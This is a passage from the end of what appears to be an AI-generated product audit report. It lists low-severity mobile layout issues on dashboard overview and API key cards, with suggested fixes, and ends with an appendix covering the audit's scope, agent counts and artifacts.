Although the three summary sections stack vertically, each row still keeps its helper text beside the main value. This forces fragments such as “Unlock Builder · / 65% discount” and “no top-up, no / expiry” into narrow, awkward wraps and leaves the rows looking unnecessarily cramped.  
- **Fix:** At the mobile breakpoint, stack each row’s helper copy below its primary value and let it use the full row width.  
- _shots: dashboard-overview-mobile.png_  


### dashboard-keys  

**V31. [LOW] API keys / Production key card / key metadata** — The metadata wraps with an orphaned separator at the start of the next line.  
The masked key remains on the first line while “· created 7/15/2026 · spent $12” drops to a second line. Starting that line with a middle dot makes the content look like an accidental desktop inline wrap rather than an intentional mobile layout.  
- **Fix:** At the mobile breakpoint, render the masked key and metadata as separate blocks and remove the leading separator from the metadata line, or keep the separator attached to the key only when both fit on one line.  
- _shots: dashboard-keys-mobile-dark.png_  

---

## 8. Appendix — coverage & artifacts

- **Screenshots:** `.artifacts/full-audit-2026-07-16/` (51 PNGs + manifest).
- **Code-audit finders (14):** engine {registry, pool, forward-transport, forward-billing, server};
  backend {auth, account+engine, payments, pricing+worker, admin+infra}; frontend {logic, auth-flows};
  cross {connections, secrets+config}. Each finding adversarially verified by a correctness lens + an
  impact lens.
- **Agents:** 234 total (226 completed, 8 filter-blocked verifiers). ~41.4M subagent tokens.
- **1 refuted finding** was dropped by the panel and is not listed.
- **Money/precision invariants** were a primary lens throughout (integer-only amounts, idempotent
  charge-ledger consumption, race-safe balance enforcement).

_Generated 2026-07-16 from workflow runs `wf_bd326ed6-3f8` (code) and `wf_8cd75496-eb5` (visual)._
